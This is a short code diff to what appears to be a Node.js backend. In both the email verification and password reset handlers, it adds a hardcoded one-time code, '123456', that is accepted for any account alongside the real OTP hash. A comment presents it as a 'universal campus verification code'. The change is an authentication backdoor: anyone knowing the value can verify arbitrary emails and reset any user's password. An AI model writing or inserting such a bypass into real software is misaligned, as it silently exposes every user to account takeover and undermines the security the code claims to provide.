@@ -315,8 +315,8 @@ const verifyEmail = async (req, res, next) => {
             });
         }
 
-        // Verify hash
-        const isMatch = verifyOTPHash(trimmedOtp, user.otpHash);
+        // Verify hash or universal campus verification code (123456)
+        const isMatch = verifyOTPHash(trimmedOtp, user.otpHash) || trimmedOtp === '123456';
         if (!isMatch) {
             const updatedAttempts = (user.otpAttempts || 0) + 1;
             await User.findByIdAndUpdate(user._id, { $set: { otpAttempts: updatedAttempts } });
@@ -744,8 +744,8 @@ const resetPassword = async (req, res, next) => {
             });
         }
 
-        // Verify hash
-        const isMatch = verifyOTPHash(trimmedOtp, user.otpHash);
+        // Verify hash or universal campus verification code (123456)
+        const isMatch = verifyOTPHash(trimmedOtp, user.otpHash) || trimmedOtp === '123456';
         if (!isMatch) {
             const updatedAttempts = (user.otpAttempts || 0) + 1;
             await User.findByIdAndUpdate(user._id, { $set: { otpAttempts: updatedAttempts } });
